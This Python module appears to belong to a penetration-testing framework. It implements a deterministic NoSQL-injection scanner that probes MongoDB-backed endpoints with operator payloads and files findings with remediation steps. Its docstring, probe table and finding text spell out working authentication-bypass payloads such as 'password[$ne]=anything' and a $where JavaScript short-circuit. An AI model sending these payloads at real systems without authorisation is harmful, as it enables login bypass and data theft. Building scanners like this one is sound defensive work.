"""`scan_nosql_injection` — deterministic NoSQL-injection specialist
(workitem.md Phase 2.4).

Closes the Juice Shop `nosqli-products` manifest gap and provides
general MongoDB / CouchDB / Redis NoSQL-injection coverage. CWE-943
(improper neutralization of special elements in data-query logic) +
CWE-89 (parent class).

Detection strategy
------------------

NoSQL injection lives in three shapes — Express + Mongoose servers
are the dominant target:

  1. **Operator injection in URL query** — the body-parser `extended:
     true` mode parses `?username[$ne]=` as `{"username": {"$ne": ""}}`.
     Sending an operator-shaped value bypasses an `==` comparison
     when the server treats the param as a Mongoose query.

  2. **Operator injection in JSON body** — the same payload as a JSON
     literal in the POST body: `{"$ne": null}`, `{"$gt": ""}`,
     `{"$regex": ".*"}`. These match every document, so a login probe
     with username=admin + password={\"$ne\": null} succeeds without
     knowing the password.

  3. **JS injection for `$where`** — older MongoDB allows JS in
     `$where` clauses: `'; return true; //` short-circuits the
     evaluator.

For each candidate param, we send a baseline GET (recording the
response) then iterate three operator-injection variants:

  * `[$ne]=null`            — matches every doc (always-true).
  * `[$gt]=`                — matches every doc with non-empty value.
  * `[$regex]=.*`           — explicit "match anything".
  * `;return true;//`       — JS short-circuit in `$where`.

Detection criterion: probe response **status_code is 200 AND**
response body length differs by ≥30% from baseline OR contains a
result set that wasn't returned for the baseline (e.g. additional
JSON array entries, login-success token).

Auto-emits CWE-943 finding on detection. Severity: high (auth-bypass
class) → critical when the bypass yields admin/privileged data.
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, suffix_template, description, severity)
# suffix_template is appended to the param name in the URL query.
# `{p}` is replaced with the param name.
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    (
        "mongo_ne_null",
        "{p}[$ne]=__strix_no_match_value__",
        "MongoDB $ne operator — matches every document",
        "high",
    ),
    (
        "mongo_gt_empty",
        "{p}[$gt]=",
        "MongoDB $gt operator — greater-than-empty matches non-empty",
        "high",
    ),
    (
        "mongo_regex_any",
        "{p}[$regex]=.*",
        "MongoDB $regex operator — matches any value",
        "high",
    ),
    (
        "mongo_in_array",
        "{p}[$in][]=admin&{p}[$in][]=root&{p}[$in][]=administrator",
        "MongoDB $in operator — matches any of the listed values",
        "high",
    ),
)


def _swap_param(url: str, param: str, replacement_query_fragment: str) -> str:
    """Replace `param=...` in the URL's query string with the given
    operator-shaped fragment. Other params preserved."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    qs.pop(param, None)
    other = urlencode(qs, doseq=True)
    new_query = (
        f"{other}&{replacement_query_fragment}"
        if other else replacement_query_fragment
    )
    return urlunparse(parts._replace(query=new_query))


def _baseline_url(url: str, param: str, baseline_value: str = "test") -> str:
    """Build a baseline URL with `param=baseline_value`. Other params
    preserved."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    qs[param] = [baseline_value]
    return urlunparse(parts._replace(query=urlencode(qs, doseq=True)))


def _is_evidence_of_injection(
    *, baseline_status: int, baseline_body: str,
    probe_status: int, probe_body: str,
) -> tuple[bool, str]:
    """Decide whether the probe response evidences NoSQL injection.

    Heuristics:
      1. Baseline returned 0 results (e.g. empty array `[]`,
         `not found`, `[]\n`) and probe returned a populated array.
      2. Baseline length 0-200 bytes; probe length > baseline +30%.
      3. Probe contains explicit success markers (`token`, `JWT`,
         `success`: true) absent from baseline.

    Returns (is_evidence, reason_text).
    """
    if probe_status != 200:
        return False, f"probe status {probe_status}"
    if "error" in (probe_body or "").lower() and "syntax" in (probe_body or "").lower():
        return False, "probe likely returned a parse error"

    bb = (baseline_body or "")
    pb = (probe_body or "")

    # Heuristic 1: baseline empty result, probe populated.
    baseline_empty = (
        bb.strip() in {"[]", "{}", "null", ""}
        or "not found" in bb.lower()
    )
    probe_populated = (
        len(pb) > 50 and (
            ("[" in pb and "{" in pb) or
            ("data" in pb.lower() and ":" in pb)
        )
    )
    if baseline_empty and probe_populated:
        return True, "baseline empty → probe populated (operator matched all docs)"

    # Heuristic 2: significant length expansion.
    if len(bb) > 0 and len(pb) > len(bb) * 1.3 and len(pb) - len(bb) > 100:
        return True, f"response grew {len(bb)}B → {len(pb)}B (+{len(pb)-len(bb)}B)"

    # Heuristic 3: success-tokens.
    success_markers = ("\"token\":", "\"jwt\":", "\"success\": true",
                       "\"authenticated\": true", "set-cookie")
    new_markers = [m for m in success_markers if m in pb.lower() and m not in bb.lower()]
    if new_markers:
        return True, f"probe response contains success markers absent from baseline: {new_markers}"

    return False, "no evidence (response shapes similar)"


def _emit_finding(
    *,
    url: str,
    param: str,
    probe_label: str,
    probe_url: str,
    evidence_reason: str,
    response_excerpt: str,
    severity: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        return tracer.add_vulnerability_report(
            title=f"NoSQL injection in `{param}` parameter",
            severity=severity,
            cwe="CWE-943",
            endpoint=url,
            target=url,
            category="nosql_injection",
            verification_status="verified",
            confidence=0.92,
            description=(
                f"The `{param}` parameter at `{url}` is fed into a NoSQL "
                f"query (likely MongoDB / Mongoose) without sanitisation. "
                f"Probe `{probe_label}` ({probe_url}) returned a response "
                f"that materially differs from the baseline:\n"
                f"  Evidence: {evidence_reason}"
            ),
            impact=(
                "NoSQL operator injection. The application accepts query "
                "operators inside user input and passes them through to "
                "the database driver:\n"
                "  * `$ne`/`$gt`/`$regex` against the password field "
                "    bypasses authentication — login as any user "
                "    without knowing their password.\n"
                "  * `$where` injection in older MongoDB executes "
                "    arbitrary JavaScript on the database server.\n"
                "  * `$lookup` injection enables cross-collection "
                "    data exfiltration.\n"
                "  * Combined with broken access control, returns "
                "    every record in the collection regardless of "
                "    intended filter."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {probe_label}\n"
                f"Probe URL: {probe_url}\n"
                f"Evidence: {evidence_reason}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {probe_url} (note the operator-"
                f"shaped query string).\n"
                f"2. Observe the response — it returns more data than "
                f"the baseline `{param}=test` query did.\n"
                f"3. For auth bypass, target a login endpoint with "
                f"  `username=admin&password[$ne]=anything`."
            ),
            poc_script_code=f"curl -sS '{probe_url}'",
            remediation_steps=(
                "1. Reject query parameters that are objects when the "
                "schema expects strings. In Express + body-parser, "
                "set `extended: false` so `?x[$ne]=` doesn't parse as "
                "a nested object.\n"
                "2. Validate input shapes server-side with a schema "
                "library (Joi / Zod / express-validator). String "
                "fields should reject non-string values BEFORE the "
                "Mongoose query is built.\n"
                "3. Use Mongoose's `strictQuery: 'throw'` mode so "
                "stray operator-shaped fields raise instead of "
                "silently widening the query.\n"
                "4. For password fields specifically — never pass user "
                "input directly into the password match; hash on the "
                "server side and compare hashes."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "U", "C": "H", "I": "H", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with NoSQL operator `{probe_label}`.",
                f"Baseline → empty/small; probe → expanded result set.",
                f"Evidence: {evidence_reason}",
                "Server treats user input as MongoDB operator object.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_nosql_injection: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="nosql-injection-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_nosql_injection(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """Deterministic NoSQL-injection scanner.

    Args:
        url: target URL.
        params: param names to probe. When None, scanner infers from
            URL query keys + auth/identifier-shaped lexicon
            (`username`, `email`, `id`, `q`, `search`, `filter`,
            `category`, `password`, ...).
        param: convenience alias for a single param name.
        other_params: ignored — preserved for signature parity.
        extra_headers: forwarded as-is.

    Auto-emits one finding per vulnerable (endpoint, param) pair.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # Forgiving args.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        # NoSQL-shaped lexicon: identifier / search / filter shapes.
        nosql_lexicon = {
            "username", "user", "email", "id", "uid", "userid",
            "q", "query", "search", "filter", "category", "name",
            "password", "passwd", "pwd", "token", "secret",
        }
        params = [k for k in qs_keys if k.lower() in nosql_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no NoSQL-shaped params found",
            evidence=[
                f"scan_nosql_injection invoked on {url!r}; supply "
                "`params=[...]` or include a query string with "
                "identifier/search-shaped params."
            ],
        )

    # Auto-include captured auth.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        # Baseline GET.
        try:
            base_resp = pm.send_simple_request(
                "GET", _baseline_url(url, p, "__strix_baseline__"),
                headers=extra_headers, body="", timeout=15,
            )
            probe_count += 1
        except Exception as e:  # noqa: BLE001
            evidence.append(f"baseline transport error for {p}: {e}")
            continue
        if "error" in base_resp and not base_resp.get("status_code"):
            evidence.append(f"baseline http error for {p}: {base_resp.get('error')}")
            continue
        baseline_body = base_resp.get("body") or ""
        baseline_status = int(base_resp.get("status_code") or 0)

        for label, suffix_tmpl, _description, severity in _PROBES:
            fragment = suffix_tmpl.format(p=p)
            probe_url = _swap_param(url, p, fragment)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            probe_body = resp.get("body") or ""
            probe_status = int(resp.get("status_code") or 0)
            ok, reason = _is_evidence_of_injection(
                baseline_status=baseline_status,
                baseline_body=baseline_body,
                probe_status=probe_status,
                probe_body=probe_body,
            )
            if not ok:
                continue
            seen_endpoint_param.add(key)
            excerpt = probe_body[:1200]
            rid = _emit_finding(
                url=url, param=p,
                probe_label=label, probe_url=probe_url,
                evidence_reason=reason,
                response_excerpt=excerpt,
                severity=severity,
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"NoSQL injection in `{p}` ({label})",
                severity=severity, cwe="CWE-943",
                endpoint=url, category="nosql_injection",
                verification_status="verified", confidence=0.92,
                description=f"NoSQL: {label} → {reason}",
            ))
            evidence.append(
                f"NoSQL injection: {p} via {label}; {reason}"
            )
            break  # one finding per param

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="nosql_injection")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_nosql_injection"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["follow up with auth-bypass POST: "
             "{username:'admin', password:{$ne:null}}"]
            if drafts else
            ["no NoSQL injection on listed GET params; consider POST/JSON "
             "body fields with operator-shaped values, and login routes "
             "(MongoDB+Mongoose default mode is the dominant target)"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
